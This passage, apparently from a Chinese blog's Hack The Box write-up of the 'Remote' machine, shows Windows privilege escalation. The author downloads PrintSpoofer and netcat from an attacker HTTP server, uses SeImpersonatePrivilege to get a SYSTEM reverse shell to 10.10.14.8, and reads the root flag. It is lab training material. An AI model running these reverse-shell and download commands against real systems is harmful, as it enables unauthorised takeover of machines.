class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Users\Public\Downloads&gt; whoami /priv<br><br>PRIVILEGES INFORMATION<br>----------------------<br><br>Privilege Name                Description                               State   <br>============================= ========================================= ========<br>SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled<br>SeIncreaseQuotaPrivilege      Adjust memory quotas <span class="hljs-keyword">for</span> a process        Disabled<br>SeAuditPrivilege              Generate security audits                  Disabled<br>SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled <br>SeImpersonatePrivilege        Impersonate a client after authentication Enabled <br>SeCreateGlobalPrivilege       Create global objects                     Enabled <br>SeIncreaseWorkingSetPrivilege Increase a process working <span class="hljs-built_in">set</span>            Disabled<br>PS C:\Users\Public\Downloads&gt; <br><br><br><br>iwr -uri http:<span class="hljs-comment">//10.10.14.8:8000/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe</span><br><br><br>┌──(kali㉿offsec)-[~/Desktop/tools]<br>└─$ python3 -m http.server <span class="hljs-number">8000</span><br>Serving HTTP on <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> port <span class="hljs-number">8000</span> (http:<span class="hljs-comment">//0.0.0.0:8000/) ...</span><br><span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.180</span> - - [<span class="hljs-number">16</span>/Mar/<span class="hljs-number">2024</span> <span class="hljs-number">22</span>:<span class="hljs-number">58</span>:<span class="hljs-number">45</span>] <span class="hljs-string">&quot;GET /PrintSpoofer64.exe HTTP/1.1&quot;</span> <span class="hljs-number">200</span> -<br><br>PS C:\Users\Public\Downloads&gt; iwr -uri http:<span class="hljs-comment">//10.10.14.8:8000/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe</span><br>PS C:\Users\Public\Downloads&gt; dir <br><br><br>    Directory: C:\Users\Public\Downloads<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>-a----        <span class="hljs-number">3</span>/<span class="hljs-number">16</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">10</span>:<span class="hljs-number">58</span> AM          <span class="hljs-number">27136</span> PrintSpoofer64.exe                                                    <br>-a----        <span class="hljs-number">3</span>/<span class="hljs-number">16</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">10</span>:<span class="hljs-number">41</span> AM           <span class="hljs-number">7168</span> reverse.exe    <br>                                   <br>PS C:\Users\Public\Downloads&gt; ./PrintSpoofer64.exe -h<br><br>PrintSpoofer v0<span class="hljs-number">.1</span> (by @itm4n)<br><br>  Provided that the current user has the SeImpersonate privilege, this tool will leverage the Print<br>  Spooler service to get a SYSTEM token and then run a custom command with CreateProcessAsUser()<br><br>Arguments:<br>  -c &lt;CMD&gt;    Execute the command *CMD*<br>  -i          Interact with the new process in the current command prompt (<span class="hljs-keyword">default</span> is non-interactive)<br>  -d &lt;ID&gt;     Spawn a new process on the desktop corresponding to this session *ID* (check your ID with qwinsta)<br>  -h          That<span class="hljs-number">&#x27;</span>s me :)<br><br>Examples:<br>  - Run PowerShell as SYSTEM in the current console<br>      PrintSpoofer.exe -i -c powershell.exe<br>  - Spawn a SYSTEM command prompt on the desktop of the session <span class="hljs-number">1</span><br>      PrintSpoofer.exe -d <span class="hljs-number">1</span> -c cmd.exe<br>  - Get a SYSTEM reverse shell<br>      PrintSpoofer.exe -c <span class="hljs-string">&quot;c:\Temp\nc.exe 10.10.13.37 1337 -e cmd&quot;</span><br><br>PS C:\Users\Public\Downloads&gt;<br><br><br><br>iwr -uri http:<span class="hljs-comment">//10.10.14.8:8000/nc.exe -Outfile nc.exe</span><br><br><br>PS C:\Users\Public\Downloads&gt; iwr -uri http:<span class="hljs-comment">//10.10.14.8:8000/nc.exe -Outfile nc.exe</span><br>PS C:\Users\Public\Downloads&gt; dir<br><br><br>    Directory: C:\Users\Public\Downloads<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>-a----        <span class="hljs-number">3</span>/<span class="hljs-number">16</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">11</span>:<span class="hljs-number">05</span> AM          <span class="hljs-number">68608</span> nc.exe                                                                <br>-a----        <span class="hljs-number">3</span>/<span class="hljs-number">16</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">10</span>:<span class="hljs-number">58</span> AM          <span class="hljs-number">27136</span> PrintSpoofer64.exe                                                    <br>-a----        <span class="hljs-number">3</span>/<span class="hljs-number">16</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">10</span>:<span class="hljs-number">41</span> AM           <span class="hljs-number">7168</span> reverse.exe                                                 <br><br>PS C:\Users\Public\Downloads&gt; <br><br>./PrintSpoofer64.exe -c <span class="hljs-string">&quot;C:\Users\Public\Downloads\nc.exe 10.10.14.8 10086 -e cmd&quot;</span><br><br>C:/Users/Administrator/Desktop/root.txt<br><br><br>PS C:\Users\Public\Downloads&gt; ./PrintSpoofer64.exe -c <span class="hljs-string">&quot;C:\Users\Public\Downloads\nc.exe 10.10.14.8 10086 -e cmd&quot;</span><br>[+] Found privilege: SeImpersonatePrivilege<br>[+] Named pipe listening...<br>[+] CreateProcessAsUser() OK<br>PS C:\Users\Public\Downloads&gt; <br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ nc -lvnp <span class="hljs-number">10086</span>      <br>listening on [any] <span class="hljs-number">10086</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.8</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.180</span>] <span class="hljs-number">49728</span><br>Microsoft Windows [Version <span class="hljs-number">10.0</span><span class="hljs-number">.17763</span><span class="hljs-number">.107</span>]<br>(c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.<br><br>C:\Windows\system32&gt;whoami<br>whoami<br>nt authority\system<br><br>C:\Windows\system32&gt;type C:/Users/Administrator/Desktop/root.txt<br>type C:/Users/Administrator/Desktop/root.txt<br>The syntax of the command is incorrect.<br><br>C:\Windows\system32&gt;type C:/Users/Administrator/Desktop/root.txt<br>type C:/Users/Administrator/Desktop/root.txt<br>The syntax of the command is incorrect.<br><br>C:\Windows\system32&gt;cd C:/Users/Administrator/Desktop/        <br>cd C:/Users/Administrator/Desktop/<br><br>C:\Users\Administrator\Desktop&gt;dir<br>dir<br> Volume in drive C has no label.<br> Volume Serial Number is D582<span class="hljs-number">-9880</span><br><br> Directory of C:\Users\Administrator\Desktop<br><br><span class="hljs-number">02</span>/<span class="hljs-number">20</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">03</span>:<span class="hljs-number">41</span> AM    &lt;DIR&gt;          .<br><span class="hljs-number">02</span>/<span class="hljs-number">20</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">03</span>:<span class="hljs-number">41</span> AM    &lt;DIR&gt;          ..<br><span class="hljs-number">03</span>/<span class="hljs-number">16</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">09</span>:<span class="hljs-number">34</span> AM                <span class="hljs-number">34</span> root.txt<br>               <span class="hljs-number">1</span> File(s)             <span class="hljs-number">34</span> bytes<br>               <span class="hljs-number">2</span> Dir(s)  <span class="hljs-number">13</span>,<span class="hljs-number">176</span>,<span class="hljs-number">942</span>,<span class="hljs-number">592</span> bytes <span class="hljs-built_in">free</span><br><br>C:\Users\Administrator\Desktop&gt;type root.txt<br>type root.txt<br>ce97750dd34949048b839958825ff45d<br><br>C:\Users\Administrator\Desktop&gt;<br></code></pre></td></tr></table></figure>
+
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/234</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Remote-htb-writeup</div>
+      <div>https://sh1yan.top/2024/03/16/Remote-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年3月16日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/03/17/ServMon-htb-writeup/" title="ServMon-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">ServMon-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/03/15/Bastion-htb-writeup/" title="Bastion-htb-writeup">
+                        <span class="hidden-mobile">Bastion-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
